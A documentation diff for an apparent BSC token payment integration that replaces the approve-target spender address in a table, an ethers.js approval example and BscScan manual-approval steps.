@@ -108,7 +108,7 @@ The first token with sufficient allowance AND balance wins.
 | Context | Address | Purpose |
 |---------|---------|---------|
 | Backend (`transferFrom`) | `0xfc625b2afee95dccc219a91d8bf391398cbeec35` | Wallet that executes `transferFrom` to collect payments |
-| Frontend (Approve target) | `0x7d7eECB98011AdE40bBA86598fd399F224DEd0B2` | Address users approve tokens to |
+| Frontend (Approve target) | `0xDEa8B80013c3799C9136999F3Bb3e798162422FC` | Address users approve tokens to |
 
 > The frontend approve target and backend spender may differ if using a proxy/multisig setup.
 
@@ -136,7 +136,7 @@ const provider = new ethers.BrowserProvider(window.ethereum);
 const signer = await provider.getSigner();
 
 const tokenAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT on BSC
-const spenderAddress = '0x7d7eECB98011AdE40bBA86598fd399F224DEd0B2';
+const spenderAddress = '0xDEa8B80013c3799C9136999F3Bb3e798162422FC';
 const amount = ethers.parseUnits('100', 18); // 100 USDT
 
 const token = new ethers.Contract(tokenAddress, [
@@ -154,7 +154,7 @@ console.log('Approved!', tx.hash);
 2. Find the token contract
 3. Go to **Write Contract** → Connect wallet
 4. Call `approve(spender, amount)`
-   - `spender`: `0x7d7eECB98011AdE40bBA86598fd399F224DEd0B2`
+   - `spender`: `0xDEa8B80013c3799C9136999F3Bb3e798162422FC`
    - `amount`: amount in wei (e.g. `100000000000000000000` for 100 tokens with 18 decimals)
 
 ---
